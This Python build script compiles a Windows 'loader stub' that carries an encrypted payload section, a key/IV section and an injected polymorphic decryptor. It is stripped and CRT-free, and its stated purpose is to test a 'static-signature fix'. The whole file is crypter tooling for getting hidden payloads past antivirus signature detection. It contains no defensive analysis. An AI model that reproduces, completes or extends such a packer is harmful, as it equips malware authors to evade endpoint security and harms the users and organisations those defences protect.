#!/usr/bin/env python3
"""
compile_stub.py <stub_cpp> <out_exe> — compile a stub with a FIXED polymorphic
decryptor and fixed section data, so two builds differ ONLY in the module block
(used to measure the static-signature fix). CRT-free + KERNEL32-only expected.

Usage: python3 compile_stub.py loader_stub_v5.cpp /tmp/r1.exe
"""
import os, struct, subprocess, sys, tempfile

ROOT = os.path.dirname(os.path.abspath(__file__))
RES = os.path.join(ROOT, "resource.res")

sys.path.insert(0, ROOT)
from polymorphic_decryptor import generate as gen_decryptor

# Cache the decryptor so every compile in a comparison run uses the SAME code
# (only the module block / section data may differ between builds).
CACHE = os.path.join(tempfile.gettempdir(), "compile_stub_dec.c")
if os.path.exists(CACHE):
    DECRYPTOR = open(CACHE).read()
else:
    DECRYPTOR = gen_decryptor()
    open(CACHE, "w").write(DECRYPTOR)
# Phase-3 contract (mirrors build_v5.py's new merged layout): ONE payload
# section + key/iv stored together at the start of a single .ksec-style
# section (key at +0, iv at +32).
SECTIONS = (".minvol",)
KEY_SEC, IV_SEC = ".ksec", ".ksec"
BPV = (204,)
BTV = (256,)


def main():
    if len(sys.argv) != 3:
        sys.exit("usage: python3 compile_stub.py <stub_cpp> <out_exe>")
    src_path, out_exe = sys.argv[1], sys.argv[2]
    src = open(src_path).read()
    poly_ph = "// @POLYMORPHIC_DECRYPTOR@"
    sec_ph = "// @SECTION_NAMES@"
    assert src.count(poly_ph) == 1 and src.count(sec_ph) == 1
    src = src.replace(poly_ph, DECRYPTOR, 1)
    sn_c = ", ".join(f'"{n}"' for n in SECTIONS)
    sll_c = ", ".join(str(len(n)) for n in SECTIONS)
    bp_c = ", ".join(str(b) for b in BPV)
    bt_c = ", ".join(str(b) for b in BTV)
    # key/iv in ONE section: key at +0, iv at +32 (matches injected stub)
    section_code = (
        f'    BYTE* kd; DWORD ks;\n'
        f'    if (!fs("{KEY_SEC}", {len(KEY_SEC)}, &kd, &ks) || ks < 48) return 2;\n'
        f'    BYTE key[32], iv[16];\n'
        f'    xmc(key, kd, 32); xmc(iv, kd + 32, 16);\n'
        f'    const char* sn[] = {{{sn_c}}};\n'
        f'    const int sll[] = {{{sll_c}}};\n'
        f'    const DWORD bpv[] = {{{bp_c}}};\n'
        f'    const DWORD btv[] = {{{bt_c}}};\n'
    )
    src = src.replace(sec_ph, section_code, 1)
    tmp = os.path.join(ROOT, "compile_stub_tmp.cpp")
    open(tmp, "w").write(src)
    cmd = ["x86_64-w64-mingw32-g++", "-std=c++11", "-O2", "-fno-builtin", "-s",
           tmp, "-o", out_exe, "-nostartfiles", "-e", "WinMain", "-Wl,--strip-all",
           RES if os.path.exists(RES) else os.devnull]
    r = subprocess.run(cmd, capture_output=True, timeout=600)
    if r.returncode != 0:
        print("COMPILE FAILED:\n" + r.stderr.decode()[-2000:])
        sys.exit(1)
    print(f"[+] compiled -> {out_exe} ({os.path.getsize(out_exe):,} bytes)")


if __name__ == "__main__":
    main()
